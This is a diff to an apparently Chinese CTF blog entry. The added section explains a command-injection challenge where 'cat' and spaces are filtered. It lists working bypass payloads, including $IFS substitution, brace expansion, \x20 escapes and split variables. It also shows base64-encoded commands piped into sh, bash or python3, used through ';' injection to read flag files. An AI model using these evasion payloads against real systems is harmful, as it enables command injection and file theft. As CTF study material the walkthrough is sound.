@@ -142,7 +142,7 @@
 <h3 id="题目：禁用-cat"><a href="#题目：禁用-cat" class="headerlink" title="题目：禁用 cat"></a>题目：禁用 cat</h3><p><font style="color:rgb(0, 0, 0);">less（更多交互）、more（只允许向后）、tac（最后一行开始反向显示）、ca\t（被解析为 cat+\t 制表符）</font></p>
 <p><code>;ca\t flag_18071273756181.php|base64</code>然后解码</p>
 <p><code>;ca\t flag_18071273756181.php</code>然后查看源代码</p>
-<h3 id="题目：禁用空格"><a href="#题目：禁用空格" class="headerlink" title="题目：禁用空格"></a>题目：禁用空格</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&#123;cat,flag.php&#125;  </span><br><span class="line">cat$&#123;IFS&#125;flag.php  </span><br><span class="line">cat$IFS$9flag.php</span><br><span class="line">cat<span class="tag">&lt;<span class="name">flag.php</span></span></span><br><span class="line"><span class="tag"><span class="attr">cat</span>&lt;&gt;</span>flag.php</span><br><span class="line">kg=$&#x27;\x20flag.php&#x27;&amp;&amp;cat$kg</span><br><span class="line">a=c;b=at;c=flag.php;$a$b $c</span><br><span class="line">b=ag;a=fl;cat$IFS$1$a$b.php</span><br><span class="line">echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</span><br><span class="line">echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|bash</span><br><span class="line">echo$IFS$1aW1wb3J0IG9zCnByaW50KG9zLnN5c3RlbSgnY2F0IGZsYWcucGhwJykp|base64$IFS$1-d|python3</span><br></pre></td></tr></table></figure>
+<h3 id="题目：禁用空格"><a href="#题目：禁用空格" class="headerlink" title="题目：禁用空格"></a>题目：禁用空格</h3><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&#123;cat,flag.php&#125;  </span><br><span class="line">cat$&#123;IFS&#125;flag.php  </span><br><span class="line">cat$IFS$9flag.php</span><br><span class="line">cat<span class="tag">&lt;<span class="name">flag.php</span></span></span><br><span class="line"><span class="tag"><span class="attr">cat</span>&lt;&gt;</span>flag.php</span><br><span class="line">kg=$&#x27;\x20flag.php&#x27;&amp;&amp;cat$kg</span><br><span class="line">a=c;b=at;c=flag.php;$a$b $c</span><br><span class="line">b=ag;a=fl;cat$IFS$1$a$b.php</span><br><span class="line">echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</span><br><span class="line">echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|bash</span><br><span class="line">echo$IFS$1aW1wb3J0IG9zCnByaW50KG9zLnN5c3RlbSgnY2F0IGZsYWcucGhwJykp|base64$IFS$1-d|python3</span><br></pre></td></tr></table></figure>
 
 <ul>
 <li>1<code>&#123;cat,flag.php&#125;</code>大括号扩展：生成一个逗号分割的字符串集合<ul>
@@ -168,8 +168,37 @@
 </ul>
 </li>
 <li>8<code>b=ag;a=fl;cat$IFS$1$a$b.php</code>定义表达式+内部字段分割符</li>
-<li>9</li>
+<li>9<code>echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</code><ul>
+<li>用 echo 输出 base64 编码的<code>cat flag</code>管道到 base64 解密，然后管道到 sh 中执行</li>
 </ul>
+</li>
+<li>10<code>echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|bash</code>只是把执行换位了 bash</li>
+<li>11<code>echo$IFS$1aW1wb3J0IG9zCnByaW50KG9zLnN5c3RlbSgnY2F0IGZsYWcucGhwJykp|base64$IFS$1-d|python3</code>用的 python 来执行<ul>
+<li><code>import os</code></li>
+<li><code>print(os.system(&#39;cat flag.php&#39;))</code></li>
+</ul>
+</li>
+</ul>
+<p>注意：<code>$IFS$1</code>就可以理解为一个空格</p>
+<h4 id="IFS-绕过"><a href="#IFS-绕过" class="headerlink" title="$IFS$绕过"></a>$IFS$绕过</h4><p>先寻找 flag 在哪里<code>;ls$IFS$1/</code></p>
+<p><img src="https://raw.githubusercontent.com/godicee/img/main/98eac60d863713bd000349235d0da6fc.png"><img src="https://raw.githubusercontent.com/godicee/img/main/b82ea356ce89c853b6196d2748de7f58.png"></p>
+<p>直接查看 flag<code>;cat$IFS$1flag_151002790815863.php</code>，查看源代码就可以看到</p>
+<p><img src="https://raw.githubusercontent.com/godicee/img/main/dd2c9af5fddd343dd300815527d346c4.png"></p>
+<p>也可以编码后输出<code>;cat$IFS$1flag_151002790815863.php|base64</code></p>
+<p><img src="https://raw.githubusercontent.com/godicee/img/main/2f265eac0effced6293806307ca9edde.png"></p>
+<h4 id="ASCII-编码绕过-x20"><a href="#ASCII-编码绕过-x20" class="headerlink" title="ASCII 编码绕过 \x20"></a>ASCII 编码绕过 \x20</h4><p><code>;a=$&#39;\x20flag_151002790815863.php&#39;&amp;&amp;cat$a</code></p>
+<h4 id="定义表达式绕过"><a href="#定义表达式绕过" class="headerlink" title="定义表达式绕过"></a>定义表达式绕过</h4><p><code>;a=ca;b=t;c=$&#39;\x20flag_151002790815863.php&#39;;$a$b$c</code></p>
+<p><code>;a=ca;b=t;c=$&#39;\x20flag_151002790815863.php&#39;;$a$b$c|base64</code></p>
+<h4 id="加密绕过"><a href="#加密绕过" class="headerlink" title="加密绕过"></a>加密绕过</h4><p><code>cat flag_151002790815863.php</code>编码<code>Y2F0IGZsYWdfMTUxMDAyNzkwODE1ODYzLnBocA==</code></p>
+<p>直接<code>;echo$IFS$1Y2F0IGZsYWdfMTUxMDAyNzkwODE1ODYzLnBocA==|base64$IFS$1-d|sh</code></p>
+<p>查看源代码即可</p>
+<p>也可以编码后输出</p>
+<p><code>;echo$IFS$1Y2F0IGZsYWdfMTUxMDAyNzkwODE1ODYzLnBocA==|base64$IFS$1-d|sh|base64</code></p>
+<p>使用 python（python 没有成功，是不是题目环境没有 python3？）</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">import os</span><br><span class="line">print(os.system(&#x27;cat flag_151002790815863.php&#x27;))</span><br><span class="line">编码后</span><br><span class="line">aW1wb3J0IG9zCnByaW50KG9zLnN5c3RlbSgnY2F0IGZsYWdfMTUxMDAyNzkwODE1ODYzLnBocCcpKQ==</span><br></pre></td></tr></table></figure>
+
+<p>payload 如下</p>
+<p><code>;echo$IFS$1aW1wb3J0IG9zCnByaW50KG9zLnN5c3RlbSgnY2F0IGZsYWdfMTUxMDAyNzkwODE1ODYzLnBocCcpKQ==|base64$IFS$1-d|python3</code></p>
 ]]></content>
       <categories>
         <category>CTF 相关</category>
